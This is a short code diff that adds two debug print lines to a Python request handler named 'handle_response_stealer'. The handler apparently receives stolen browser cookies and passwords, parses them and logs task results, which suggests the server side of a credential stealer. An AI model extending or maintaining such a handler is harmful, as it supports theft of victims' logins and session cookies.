@@ -216,7 +216,9 @@ def handle_response_stealer():
         request.get_data()
         data = request.data
         data = json.loads(data)
+        print("Before calling wyatts wonderland")
         cookie_values, password_values = WyattWonderland.newParseJSON(data)
+        print("After calling wyatts wonderland")
         task_id = data['task_id']
         success = data['success']
         if success in ['Success', 'success']:
